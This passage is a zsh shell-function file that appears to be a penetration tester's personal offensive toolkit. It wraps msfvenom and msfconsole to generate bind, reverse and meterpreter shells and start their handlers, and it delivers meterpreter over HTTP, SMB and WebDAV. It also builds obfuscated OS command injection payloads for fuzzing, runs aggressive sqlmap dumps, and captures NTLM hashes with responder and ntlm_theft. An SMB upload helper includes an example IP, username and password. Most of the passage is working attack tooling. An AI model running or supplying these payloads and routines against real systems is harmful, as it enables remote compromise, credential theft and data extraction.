    read -r type\?"[+] SELECT STAGING: (staged / stageless): "
    if [[ $type == "stageless" ]]; then
        read -r lis\?"[+] SELECT CONNECTION (bind / reverse): "
    fi

    if [[ $type == "staged" ]]; then
        read -r lis\?"[+] SELECT CONNECTION (bind / reverse / meterpreter): "
    fi

    read -r lhost\?"[+] INPUT PAYLOAD IP/NIC: "
    read -r port\?"[+] INPUT PAYLOAD PORT: "

    if [[ $os =~ ^lin* ]]; then
        if [[ $os == "lin32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi

            if [[ $type == "stageless" ]]; then 
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "lin64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi

    if [[ $os =~ ^win* ]]; then
        if [[ $os == "win64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "win32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi
}

# Interface Setting
chnic(){
    nic_lst=$(ifconfig | awk -F" " '{print $1}' | grep : | tr -d ':' | tr '\n' ', ')
    read -r nic\?"SELECT NIC (${nic_lst%?}): "
    export inter=$nic
    export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
}

alias copyfile='xclip -sel clip'

# GET/POST/Header discovery
paramscan(){
    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use burp-parameter): " -c wd
        if [[ -z $wd ]]; then
            wd=/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
        fi
    read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
    if [[ -z $cookie ]]; then
        cookie="rand=rand"
    fi

    echo "\nX8 SEARCH (GET/POST)\n"    
    x8 -u $1 -H "Cookie: $cookie" -X GET POST -w $wd

    echo -e "\nX8 SEARCH (JSON)\n"
    x8 -u $1 -H "Cookie: $cookie" -X POST -w $wd -t json
}

# Usernames Generation
usergen(){
    echo -e "\nGENERATING USERNAMES\n"
    ~/tools/username-anarchy/username-anarchy -i $1 > gen_users.txt
}

# Neo4j server
neostart(){
    sudo neo4j console
}

# Add/Extend Host Mappings of /etc/hosts
addhost() {
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}


# AD Realm Setting Function
krbconf(){
    salt=$(openssl rand -hex 4)

    if [[ -f $1 ]]; then
        while read ip; do krbconf $ip; done < $1
        return 1
    fi

    echo -e "\n[+] SYNCING TIME WITH DC \"$1\"\n"
    sudo timedatectl set-ntp off
    timeout 1 sudo rdate -n $1

    echo -e "\n[+] ADDING AD REALM FOR \"$1\"\n"
    nxc smb $1 --generate-krb5-file /tmp/krb5conf
    if [[ ! -s /tmp/krb5conf ]]; then
        read -r manualset\?"[-] KB GENERATION FAILED, COULD NOT CONTACT SMB ON \"$1\", DO YOU STILL WANT TO ADD A REALM? (Y/N): "
        if [[ $manualset =~ [yY] ]]; then
            read -r dom\?"[+] INPUT DOMAIN: "
            read -r dc_fqdn\?"[+] INPUT DC_FQDN: "
            echo "[libdefaults]\n    dns_lookup_kdc = false\n    dns_lookup_realm = false\n    default_realm = ${dom:u}\n\n[realms]\n    ${dom:u} = {\n        kdc = $dc_fqdn\n        admin_server = $dc_fqdn\n        default_domain = $dom\n    }\n\n[domain_realm]\n    .$dom = ${dom:u}\n    $dom = ${dom:u}" > /tmp/krb5conf
        fi
        cat /tmp/krb5conf
        addhost $1 $dc_fqdn
        addhost $1 $dom
    else
        genhosts $1
    fi

    dom=$(cat /tmp/krb5conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
    echo -e "\n[+] ADDING NS CONFIGURTATION FOR \"$1\" ON DOMAIN \"$dom\"\n"
    echo "\n#---AD GENERATED---#\ndomain $dom\nnameserver $1\n" | sudo tee --append /etc/resolv.conf

    if [[ -f /etc/krb5.conf ]]; then
        prev_dom=$(cat /etc/krb5.conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
        if [[ ! -z $prev_dom ]]; then
            def_rlm=$(cat /tmp/krb5conf | grep -i default_realm | tr -d ' ')
            sudo sed -i -e "s/    default_realm = $prev_dom/    $def_rlm/g" /etc/krb5.conf
            sudo sed -i -e "s/    default_realm=$prev_dom/    $def_rlm/g" /etc/krb5.conf
            cat /tmp/krb5conf | tail -n 2 | while read line; do grep -qxF "    $line" /etc/krb5.conf || echo "    $line" | sudo tee --append /etc/krb5.conf; done
            rlm=$(cat /tmp/krb5conf | grep kdc | tail -n 1 | awk -F"=" '{print $2}')
            blk=$(cat /tmp/krb5conf | grep -i { -A4)
            rlm_chk=$(cat /etc/krb5.conf | grep -i $rlm)
            if [[ -z $rlm_chk ]]; then
                sudo awk -v text="$blk" '/\[realms\]/ {print; print "" text; next} 1' /etc/krb5.conf > tmp && sudo mv tmp /etc/krb5.conf
            fi
        else
            sudo mv /tmp/krb5conf /etc/krb5.conf
        fi
    else
        sudo mv /tmp/krb5conf /etc/krb5.conf
    fi
    rm /tmp/krb5conf &>/dev/null
}


# AD Host Mapping generator
genhosts(){
    echo -e "\nFINDING AND MAPPING AD HOSTNAMES IN \"$1\"\n"
    nxc smb $1 --generate-hosts-file /tmp/hostsfile
    while read line; do
        grep -qxF $line /etc/hosts || echo $line | sudo tee --append /etc/hosts
    done < /tmp/hostsfile
    rm /tmp/hostsfile
}

sqlscan(){
    echo -e "\nSCANNING REQUEST \"$1\" FOR SQL INJECTION WITH ALL METHODS\n"
    echo -e "----------------------------------"
    cat "$1"
    echo -e "----------------------------------"
    echo -n "Do you want to append '--smart' to sqlmap to test only if heuristics are positive? (y/n): "
    read choice
    case "$choice" in
        y|Y|yes|YES)
            sqlmap -r "$1" --level 5 --risk 3 --dbs --smart --privileges --threads=10 --technique=BESQUT --random-agent --batch --fingerprint --parse-errors --banner --flush-session --fresh-queries --tamper=between,space2comment
            ;;
        *)
            sqlmap -r "$1" -D status --dump --level 5 --risk 3 --dbs --privileges --threads=10 --technique=BESQUT --random-agent --batch --fingerprint --parse-errors --banner --flush-session --fresh-queries --tamper=between,space2comment,equaltolike
            ;;
    esac
}


# Exploit Research Function
ssp(){
    fileout=$(echo "$1" | tr -d ' ' | tr -d '/')
    echo -e "\n[+] SEARCHING CVE POCs FOR \"$1\"\n"
    vulnx search $1 --limit 100 --silent "poc_count:>0" --json | jq '.results[] | {
    CVE_ID: .cve_id,
    Vulnerability_Type: .vulnerability_type,
    Description: .description,
    POC_URLs: [.pocs[].url],
}' | tee exploits_$(echo $1 | tr " " "_").txt
}


# Add/Extend Host Mappings of /etc/hosts
addhost() {
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}

collab(){
    interactsh-client -up && interactsh-client -auth
    interactsh-client
}

# Endpoints Generation
urlgen(){
    cewl $1 -d 3 -m 3 --lowercase -w /tmp/endpoints_$(echo $1 | unfurl format %d).txt
}

alias bashfuscator='source ~/tools/bashfuscator-env/bin/activate && bashfuscator'


# OS Injection Linux Fuzzer
osscan(){
    rm ./os_injection.txt
    read -r cmd\?"[+] INPUT COMMAND TO EXECUTE: "
    read -r regex\?"[+] INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "

    bin=$(echo "$cmd" | awk '{print $1}')
    echo "rev" | sed 's/./&$()/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed 's/./&$@/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\'\'/1" >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\"\"/1" >> /tmp/rev_mangle.txt

    while read rev; do
        revstr="$rev<<<'$(echo "$cmd" | rev)'"
        echo "\$($revstr)" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$revstr\`" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/rev_mangle.txt
    rm /tmp/rev_mangle.txt

    echo "xxd" | sed 's/./&$()/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed 's/./&$@/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\'\'/1" >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\"\"/1" >> /tmp/xxd_mangle.txt
    echo "\$(rev<<<xxd)" >> /tmp/xxd_mangle.txt
    while read xxd; do
        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/xxd_mangle.txt
    rm /tmp/xxd_mangle.txt

    echo "$cmd" | sed 's/./&$()/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed 's/./&$@/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\'\'/1" >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\"\"/1" >> /tmp/cmd_mangle.txt
    while read cmdp; do
        echo "$cmdp" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\$($cmdp)" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$cmdp\`" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/cmd_mangle.txt
    rm /tmp/cmd_mangle.txt

    while read sp; do
        cat ~/wordlists/OS_INJECTION/payloads.txt | sed "s/ /$sp/g" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < ~/wordlists/OS_INJECTION/spaces.txt
    cat ~/wordlists/OS_INJECTION/payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ~/wordlists/OS_INJECTION/payloads.txt

    while read sp; do
        while read sep; do
            while read payload; do
                echo "$sp$sep$sp$payload" >> os_injection.txt
                echo "$sp$sep$sp$payload$sp#" >> os_injection.txt
            done < ~/wordlists/OS_INJECTION/payloads.txt
        done < ~/wordlists/OS_INJECTION/separators.txt
    done < ~/wordlists/OS_INJECTION/spaces.txt
    rm ~/wordlists/OS_INJECTION/payloads.txt
    
    cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
    if [[ ! -z $regex ]]; then
        echo -e "\n[+] FUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s -mr $regex
    else
        echo -e "\n[+] FUZZING REQUEST \"$1\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s
    fi

    echo -e "\n[+] TESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
    cur=$(pwd)
    cd ~/tools/commix
    python3 commix.py --update
    python3 commix.py -r $cur/$1 --flush-session --mobile --purge --current-user --level=3 --tamper=backslashes,backticks,base64encode,caret,dollaratsigns,doublequotes,multiplespaces,nested,printf2echo,randomcase,rev,singlequotes,slash2env,sleep2timeout,sleep2usleep,space2htab,space2ifs,space2plus,space2vtab
    cd $cur
}


# python virtual environment
pyenv() {
    echo -e "\nSPAWNING VIRTUAL PYTHON3 ENVIRONMENT\n"
    python3 -m venv venv
    source venv/bin/activate

    if [[ -f ./requirements.txt ]]; then
        python3 -m pip install -r requirements.txt
    fi

    # Ask if the user wants to create an alias
    echo -n "Do you want to create a shell alias for this project? (y/N): "
    read CREATE_ALIAS

    if [[ "$CREATE_ALIAS" =~ ^[Yy]$ ]]; then
        PY_BIN="$(which python3)"
        PROJECT_DIR="$(pwd)"
        TOOL_NAME="$(basename "$PROJECT_DIR")"

        # Ask which script should be the entrypoint
        echo -n "Enter script filename to run [default: main.py]: "
        read SCRIPT_NAME
        SCRIPT_NAME="${SCRIPT_NAME:-main.py}"
        
        # Check if the file exists
        while [[ ! -f "./$SCRIPT_NAME" ]]; do
            echo "Error: '$SCRIPT_NAME' not found in current folder."
            echo -n "Enter script filename to run: "
            read SCRIPT_NAME
        done

        # Create alias in .zshrc
        echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
        echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
    else
        echo "Skipping alias creation."
    fi
}

pyenv2() {
    echo -e "\nSPAWNING VIRTUAL PYTHON2.7 ENVIRONMENT\n"

    # Create the environment explicitly using python2.7
    virtualenv -p python2.7 venv
    source venv/bin/activate

    if [[ -f ./requirements.txt ]]; then
        # Use 'python -m pip' to ensure we use the venv's pip
        python -m pip install -r requirements.txt
    fi

    # Ask if the user wants to create an alias
    echo -n "Do you want to create a shell alias for this project? (y/N): "
    read CREATE_ALIAS

    if [[ "$CREATE_ALIAS" =~ ^[Yy]$ ]]; then
        # In a Python 2 venv, the binary is usually named 'python', not 'python3'
        PY_BIN="$(which python)" 
        PROJECT_DIR="$(pwd)"
        TOOL_NAME="$(basename "$PROJECT_DIR")"

        # Ask which script should be the entrypoint
        echo -n "Enter script filename to run [default: main.py]: "
        read SCRIPT_NAME
        SCRIPT_NAME="${SCRIPT_NAME:-main.py}"

        # Create alias in .zshrc
        echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
        echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
    else
        echo "Skipping alias creation."
    fi
}

#Responder Server
respond(){
    chnic
    sudo responder -I $inter -wdv
}

# LLMNR File Generator
ntlmtheft(){
    cd /home/damuna/tools/ntlm_theft
    rm -rf /home/damuna/tools/ntlm_theft/NTDOCS
    python3 ntlm_theft.py -g all -s $1 -f NTDOCS
}

llmnr() {
    if [ $# -lt 4 ]; then
        echo "Usage: smb_upload <server> <share> <username> <password> [file|directory|pattern]"
        echo "Examples:"
        echo "  smb_upload 10.10.11.69 IT j.fleischman 'password'          # Upload all files in current dir"
        echo "  smb_upload 10.10.11.69 IT j.fleischman 'password' exploit.zip  # Upload specific file"
        echo "  smb_upload 10.10.11.69 IT j.fleischman 'password' *.txt    # Upload all txt files"
        echo "  smb_upload 10.10.11.69 IT j.fleischman 'password' ./path   # Upload all files in ./path"
        return 1
    fi
    
    local server="$1"
    local share="$2"
    local username="$3"
    local auth="$4"
    local target="${5:-*}"  # Default to all files in current directory
    local success_count=0
    local fail_count=0
    
    echo "Connecting to //$server/$share..."
    
    # Build auth options
    local auth_options=(-U "$username%$auth")
    if [[ "$auth" == *":"* ]]; then
        auth_options=(--pw-nt-hash -U "$username%$auth")
    fi
    
    # Handle different target types
    if [ "$target" = "*" ]; then
        # Upload all files in current directory
        echo "Uploading all files from current directory: $(pwd)"
        for file in *; do
            if [ -f "$file" ]; then
                echo -n "Uploading $file... "
                if smbclient "//$server/$share" "${auth_options[@]}" -c "put \"$file\"" 2>/dev/null; then
                    echo "✓"
                    ((success_count++))
                else
                    echo "✗"
                    ((fail_count++))
                fi
            fi
        done
    elif [ -f "$target" ]; then
        # Single specific file
        echo "Uploading specific file: $target"
        echo -n "Uploading $(basename "$target")... "
        if smbclient "//$server/$share" "${auth_options[@]}" -c "put \"$target\"" 2>/dev/null; then
            echo "✓"
            ((success_count++))
        else
            echo "✗"
            ((fail_count++))
        fi
    elif [ -d "$target" ]; then
        # Directory - upload all files in that directory
        echo "Uploading all files from directory: $target"
        for file in "$target"/*; do
            if [ -f "$file" ]; then
                echo -n "Uploading $(basename "$file")... "
                if smbclient "//$server/$share" "${auth_options[@]}" -c "put \"$file\"" 2>/dev/null; then
                    echo "✓"
                    ((success_count++))
                else
                    echo "✗"
                    ((fail_count++))
                fi
            fi
        done
    else
        # Pattern (like *.txt)
        echo "Uploading files matching pattern: $target"
        for file in $target; do
            if [ -f "$file" ]; then
                echo -n "Uploading $file... "
                if smbclient "//$server/$share" "${auth_options[@]}" -c "put \"$file\"" 2>/dev/null; then
                    echo "✓"
                    ((success_count++))
                else
                    echo "✗"
                    ((fail_count++))
                fi
            fi
        done
    fi
    
    echo "Upload complete: $success_count successful, $fail_count failed"
    return $fail_count
}

wordscan(){
    wpscan --api-token $wp_scan_api --url $1 --enumerate u,vp,vt,cb,dbe --rua --disable-tls-checks --no-banner -t 20
}

# Ldap domain dump
ldapdump(){
    if [ $# -lt 3 ]; then
        echo "Usage: ldapdump <DOMAIN\\user> <password> <ip>"
        return 1
    fi
    
    local domain_user="$1"
    local password="$2"
    local ip="$3"
    
    # Handle empty password case for anonymous authentication
    if [ -z "$password" ]; then
        ldapdomaindump -u "$domain_user" -o . "$ip"
    else
        ldapdomaindump -u "$domain_user" -p "$password" -o . "$ip"
    fi
    
    echo "Extracting usernames and saving them in ~/machines/user.txt"
    cat domain_users.json | grep -i samaccountname -A1 | grep -vi samaccountname | grep -v - | tr -d '>' | sort -u > ~/machines/user.txt
    
    echo -e "\n[*] Info and Descriptions:"
    cat domain_users.json | grep -Ei 'info|description' -A1
}

# PFX Certificate & Key extraction
pfx2key(){
    filename=$(echo $1)
    echo "pfx2key <pfx_file>\n"
    openssl pkcs12 -in $1 -clcerts -nokeys -out "${filename%.*}.crt"
    openssl pkcs12 -in $1 -nocerts -out /tmp/out.enc
    openssl rsa -in /tmp/out.enc -out "${filename%.*}.key"; rm /tmp/out.enc
    echo "\n SAVED ${filename%.*}.key and ${filename%.*}.crt"
}

# Meterpreter Delivery Windows Generator
meterup(){
    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
    chnic
    nicip=$(ifconfig $nic | grep inet | awk '{print $2}' | head -n 1)   
    read -r lport\?"[+] INPUT LISTENER PORT: "
    read -r srvport\?"[+] INPUT HTTP DELIVERY PORT: "
    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ "win" ]]; then
        read -r mtd\?"[+] SELECT DELIVERY METHOD (smb, http, webdav): "
        
    fi

    pl=""
    if [[ $os =~ "lin" ]]; then
        if [[ $os == "lin32" ]]; then
            pl="/x86/"
        fi
        if [[ $os == "lin64" ]]; then
            pl="/x64/"
        fi
        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
    fi

    if [[ $os =~ "win" ]]; then
        if [[ $os == "win32" ]]; then
            pl="/"
        fi

        if [[ $os == "win64" ]]; then
            pl="/x64/"
        fi

        if [[ $mtd == "smb" ]]; then
            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
        fi

        if [[ $mtd == "http" ]]; then
            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run;"
        fi

        if [[ $mtd == "webdav" ]]; then
            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
        fi
    fi
}    

# vhd vmsk vhdx Mounter
vhdMount() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: vhdMount <File>"
        echo "To unmount: vhdMount -u"
        return 1
    fi

    # Unmount if -u flag is passed
    if [[ "$1" == "-u" ]]; then
        echo "Unmounting VHD..."
        sudo umount /mnt/my_vhs 2>/dev/null
        sudo vgchange -an 2>/dev/null
        sudo kpartx -d /dev/nbd0 2>/dev/null
        sudo qemu-nbd -d /dev/nbd0 2>/dev/null
        sudo rmmod nbd 2>/dev/null
        sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
        echo "Unmount complete"
        return 0
    fi

    # Mounting procedure
    echo "Mounting VHD: $1"
    
    # Cleanup any existing mounts first
    sudo umount /mnt/my_vhs 2>/dev/null
    sudo vgchange -an 2>/dev/null
    sudo kpartx -d /dev/nbd0 2>/dev/null
    sudo qemu-nbd -d /dev/nbd0 2>/dev/null
    sudo rmmod nbd 2>/dev/null
    sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
    
    # Setup new mount
    sudo mkdir -p /mnt/my_vhs
    sudo modprobe nbd max_part=16
    
    # Connect to NBD device
